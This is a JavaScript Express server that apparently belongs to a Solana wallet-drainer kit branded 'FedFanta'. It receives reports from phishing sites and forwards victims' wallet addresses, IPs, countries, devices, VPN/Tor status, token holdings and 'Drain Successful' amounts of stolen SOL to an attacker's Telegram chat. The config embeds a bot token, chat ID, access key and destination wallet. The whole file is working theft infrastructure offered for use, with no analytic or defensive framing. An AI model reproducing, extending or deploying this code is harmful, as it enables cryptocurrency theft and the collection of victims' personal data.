// ==========================================
// 🩸 FEDFANTA TELEGRAM NOTIFICATION SERVER
// Receives wallet connection events and formats Telegram alerts
// ==========================================
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// ==========================================
// ⚙️ CONFIG
// ==========================================
const CFG = {
    PORT: 9876,
    TELEGRAM_TOKEN: '8654897884:AAE8gKl-Ol_XPQ2lnUnhy4-aC5AaGYxmea0',    // @BotFather
    TELEGRAM_CHAT_ID: 7142965980,            // @KaxoBrixks
    REQUIRED_KEY: 'fuckyoubitch',                // key sender must use
    DESTINATION_WALLET: 'EH4XsehQw2LdEJVEn1go3gHBybGf8bF277G5HwR2TYc7',
    SOLANA_RPC: 'https://api.mainnet-beta.solana.com',
    TOKEN_LIST_URL: 'https://tokens.jup.ag/tokens?tags=verified', // for token metadata
};

// Track recent drains to avoid dupes
const recentSigs = new Set();

// Cache for token metadata
const tokenMetaCache = {};

// ==========================================
// 📨 TELEGRAM
// ==========================================
async function sendTelegram(text) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${CFG.TELEGRAM_TOKEN}/sendMessage`,
            {
                chat_id: CFG.TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML',
            },
            { timeout: 10000 }
        );
    } catch (e) {
        console.log('[Server] Telegram send error:', e.response?.data || e.message);
    }
}

// ==========================================
// 🔍 TOKEN METADATA
// ==========================================
async function getTokenMetadata(mintAddress) {
    if (tokenMetaCache[mintAddress]) return tokenMetaCache[mintAddress];

    // Try token list first
    try {
        const res = await axios.get(CFG.TOKEN_LIST_URL, { timeout: 5000 });
        if (res.data && Array.isArray(res.data)) {
            const found = res.data.find(t => t.address === mintAddress);
            if (found) {
                const meta = { name: found.name, symbol: found.symbol };
                tokenMetaCache[mintAddress] = meta;
                return meta;
            }
        }
    } catch (e) { /* ignore */ }

    // Fallback: use mint address
    const meta = { name: mintAddress.substring(0, 8) + '...', symbol: '???', amount: 0 };
    tokenMetaCache[mintAddress] = meta;
    return meta;
}

async function formatTokenWithAmount(mint, amount) {
    const meta = await getTokenMetadata(mint);
    // Amount is raw with decimals — we don't know decimals from sender
    // so show raw or approximate
    const amountNum = parseFloat(amount);
    return `${meta.name || meta.symbol} (${meta.symbol || '???'})\n$${amountNum.toFixed(2)}`;
}

// ==========================================
// 🎨 FORMAT: FEDFANTA STYLE
// ==========================================
function formatNewConnect(data) {
    const wallet = data.wallet || 'unknown';
    const ip = data.ip || 'unknown';
    const country = data.country || 'unknown';
    const strategy = data.strategy || 'Solana Mainnet';
    const website = data.website || 'unknown';
    const dappVersion = data.dappVersion || 'v5.0';
    const device = data.device || 'unknown';
    const walletName = data.walletName || '';
    const securityExt = data.securityExt || 'No';
    const vpn = data.vpn || 'No';
    const tor = data.tor || 'No';
    const proxy = data.proxy || 'No';

    let msg = `🩸 FedFanta | New connect\n`;
    if (walletName) msg += `${walletName}\n`;
    msg += `Wallet: ${wallet}\n`;
    msg += `IP: ${ip} dE ${country}\n`;
    msg += `Drain strategy: ${strategy}\n`;

    // Balance
    if (data.balanceUsd && data.balanceUsd > 0) {
        msg += `- Balance: $${data.balanceUsd} USD\n`;
    }

    msg += `Website: ${website}\n`;

    // User Assets
    if (data.tokens && data.tokens.length > 0) {
        msg += `User Assets\n`;
        // Format each token
        const tokenList = data.tokens.map(t => {
            const meta = { name: '', symbol: '' };
            if (t.name) meta.name = t.name;
            if (t.symbol) meta.symbol = t.symbol;
            else meta.symbol = t.mint ? t.mint.substring(0, 6) : '???';
            const amt = parseFloat(t.amount) || 0;
            return `${meta.name || meta.symbol} ($${amt.toFixed(2)})`;
        });
        msg += tokenList.join('\n');
    }

    msg += `\nDevice: ${device}\n`;
    msg += `security extension?: ${securityExt}\n`;
    msg += `Vpn: ${vpn}\n`;
    msg += `Tor: ${tor}\n`;
    msg += `Proxy: ${proxy}\n`;
    msg += `Dapp version: ${dappVersion}`;

    return msg;
}

function formatDrainSuccess(data) {
    const wallet = data.wallet || 'unknown';
    const ip = data.ip || 'unknown';
    const country = data.country || 'unknown';
    const strategy = data.strategy || 'Solana Mainnet';
    const website = data.website || 'unknown';
    const dappVersion = data.dappVersion || 'v5.0';
    const device = data.device || 'unknown';
    const securityExt = data.securityExt || 'No';
    const vpn = data.vpn || 'No';
    const tor = data.tor || 'No';
    const proxy = data.proxy || 'No';
    const walletName = data.walletName || '';

    let msg = `🩸 FedFanta | ✅ Drain Successful\n`;
    if (walletName) msg += `${walletName}\n`;
    msg += `Wallet: ${wallet}\n`;
    msg += `IP: ${ip} dE ${country}\n`;
    msg += `Drain strategy: ${strategy}\n`;

    // Balance
    if (data.balanceUsd && data.balanceUsd > 0) {
        msg += `- Balance: $${data.balanceUsd} USD\n`;
    }

    msg += `Website: ${website}\n`;

    // Token assets
    if (data.tokens && data.tokens.length > 0) {
        msg += `User Assets\n`;
        const tokenList = data.tokens.map(t => {
            const meta = { name: '', symbol: '' };
            if (t.name) meta.name = t.name;
            if (t.symbol) meta.symbol = t.symbol;
            else meta.symbol = t.mint ? t.mint.substring(0, 6) : '???';
            const amt = parseFloat(t.amount) || 0;
            return `${meta.name || meta.symbol} ($${amt.toFixed(2)})`;
        });
        msg += tokenList.join('\n');
    }

    // Sol drained
    if (data.solDrained && data.solDrained > 0) {
        msg += `\n💸 Drained: ${data.solDrained.toFixed(4)} SOL`;
    }

    msg += `\nDevice: ${device}\n`;
    msg += `security extension?: ${securityExt}\n`;
    msg += `Vpn: ${vpn}\n`;
    msg += `Tor: ${tor}\n`;
    msg += `Proxy: ${proxy}\n`;
    msg += `Dapp version: ${dappVersion}`;

    return msg;
}

// ==========================================
// 📡 API ENDPOINTS
// ==========================================

// POST /drain/connect — new wallet connected
app.post('/drain/connect', (req, res) => {
    const { key, ...data } = req.body;

    if (data.key) delete data.key; // remove key from data

    if (key !== CFG.REQUIRED_KEY) {
        return res.status(401).json({ error: 'Invalid key' });
    }

    console.log('[Server] 🩸 New connect:', data.wallet);
    const msg = formatNewConnect(data);
    sendTelegram(msg);
    res.json({ ok: true });
});

// POST /drain/success — wallet drained
app.post('/drain/success', (req, res) => {
    const { key, ...data } = req.body;

    if (data.key) delete data.key;

    if (key !== CFG.REQUIRED_KEY) {
        return res.status(401).json({ error: 'Invalid key' });
    }

    // Dedupe by signature
    if (data.signature && recentSigs.has(data.signature)) {
        console.log('[Server] Duplicate drain, skipping:', data.signature);
        return res.json({ ok: false, duplicate: true });
    }
    if (data.signature) recentSigs.add(data.signature);

    console.log('[Server] ✅ Drain success:', data.wallet);
    const msg = formatDrainSuccess(data);
    sendTelegram(msg);
    res.json({ ok: true });
});

// POST /drain/update — update wallet info after scan
app.post('/drain/update', (req, res) => {
    const { key, ...data } = req.body;
    if (data.key) delete data.key;

    if (key !== CFG.REQUIRED_KEY) {
        return res.status(401).json({ error: 'Invalid key' });
    }

    console.log('[Server] 📊 Update:', data.wallet);
    // Could send a separate message or append to existing — for now just log
    let msg = `📊 *Wallet Updated*\n\n` +
        `📌 *Wallet:* \`${data.wallet}\`\n` +
        `💰 *Balance:* $${data.balanceUsd || 0} USD\n` +
        `📦 *Tokens:* ${data.tokens ? data.tokens.length : 0}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`;
    sendTelegram(msg);
    res.json({ ok: true });
});

// ==========================================
// 🚀 START
// ==========================================
app.listen(CFG.PORT, () => {
    console.log(`[Server] 🩸 FedFanta Monitor Server running on port ${CFG.PORT}`);
    console.log(`[Server] Telegram chat: ${CFG.TELEGRAM_CHAT_ID}`);
    console.log(`[Server] Monitor needs key: ${CFG.REQUIRED_KEY}`);
});
